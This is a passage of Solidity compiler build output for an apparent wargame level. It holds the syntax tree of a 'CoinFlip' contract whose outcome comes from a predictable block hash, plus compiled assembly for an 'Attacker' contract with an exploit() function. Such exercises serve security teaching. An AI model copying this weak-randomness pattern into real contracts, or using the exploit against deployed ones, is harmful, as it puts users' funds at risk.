											"end": 1698,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1677,
											"end": 1698,
											"name": "tag",
											"source": 2,
											"value": "59"
										},
										{
											"begin": 1677,
											"end": 1698,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1670,
											"end": 1675,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1667,
											"end": 1699,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 1657,
											"end": 1717,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1657,
											"end": 1717,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1713,
											"end": 1714,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1710,
											"end": 1711,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1703,
											"end": 1715,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1657,
											"end": 1717,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1657,
											"end": 1717,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1607,
											"end": 1723,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1607,
											"end": 1723,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1783,
											"end": 1788,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1814,
											"end": 1820,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1808,
											"end": 1821,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 1799,
											"end": 1821,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1799,
											"end": 1821,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1830,
											"end": 1860,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1854,
											"end": 1859,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1830,
											"end": 1860,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 1830,
											"end": 1860,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1830,
											"end": 1860,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1830,
											"end": 1860,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1729,
											"end": 1866,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1939,
											"end": 1945,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1988,
											"end": 1990,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1976,
											"end": 1985,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1967,
											"end": 1974,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1963,
											"end": 1986,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1959,
											"end": 1991,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 1956,
											"end": 2075,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1956,
											"end": 2075,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1956,
											"end": 2075,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1994,
											"end": 2073,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 1994,
											"end": 2073,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1994,
											"end": 2073,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1994,
											"end": 2073,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 1994,
											"end": 2073,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1956,
											"end": 2075,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1956,
											"end": 2075,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2114,
											"end": 2115,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2139,
											"end": 2200,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2192,
											"end": 2199,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2183,
											"end": 2189,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2172,
											"end": 2181,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2168,
											"end": 2190,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2200,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 2139,
											"end": 2200,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2139,
											"end": 2200,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2139,
											"end": 2200,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2129,
											"end": 2200,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2129,
											"end": 2200,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2085,
											"end": 2210,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 2217,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"src/level03.sol",
								"tests/test03.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"exploit()": "63d9b770"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_level\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"tests/test03.sol\":\"Attacker\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/level03.sol\":{\"keccak256\":\"0xb95bc60e86408dd64b7966baa45eb5ef0590ec2c19e5975041c52077a4f87bcd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://087f97fd09c887feeee644218608b55eed2ece4776a3cdf6fcc369e69819421e\",\"dweb:/ipfs/QmZKXyRfvRUud7RoWu64WgPhnPA3UrufZsRdLJ5XDYgRr2\"]},\"tests/test03.sol\":{\"keccak256\":\"0x19c10a8e1f905e4c5f31c05d6ad7de0854e1d6b557a05add867f2587f5c3b39e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://51240fdaff853345a9cccecf88af13badcdd4bb894922f4f7f34e450f53ea010\",\"dweb:/ipfs/QmPM1mg9K4jd67rspCHEsaUY2GH4AKGJcNUjfYV8yWaEcu\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 86,
								"contract": "tests/test03.sol:Attacker",
								"label": "lastHash",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 89,
								"contract": "tests/test03.sol:Attacker",
								"label": "FACTOR",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 92,
								"contract": "tests/test03.sol:Attacker",
								"label": "level",
								"offset": 0,
								"slot": "2",
								"type": "t_contract(CoinFlip)81"
							}
						],
						"types": {
							"t_contract(CoinFlip)81": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"src/level03.sol": {
				"ast": {
					"absolutePath": "src/level03.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						]
					},
					"id": 82,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "CoinFlip",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nameLocation": "66:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "95:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "80:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "80:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "122:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "114:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "114:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "142:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "134:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "134:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "151:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "247:30:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "253:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "271:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "253:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "253:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "244:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "247:0:0"
									},
									"scope": 81,
									"src": "233:44:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "330:380:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "344:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "336:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "336:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "375:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberLocation": "381:6:0",
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "375:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "390:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "375:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "365:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "365:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "357:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "357:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "357:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "336:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "404:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "416:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "404:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "400:51:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "428:23:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "436:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "436:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "436:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "457:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "468:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "457:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "457:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "492:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "484:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "484:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "503:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "516:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "503:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "484:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "533:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "528:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "528:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "540:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "552:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "540:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "563:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "540:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "556:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "528:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "579:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "587:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "579:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "652:54:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "660:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "678:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "660:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "660:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "694:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "687:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "575:131:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "595:51:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "603:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "603:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "603:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "635:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "628:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "290:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "300:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "295:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "295:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "294:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "324:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "324:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "323:6:0"
									},
									"scope": 81,
									"src": "281:429:0",
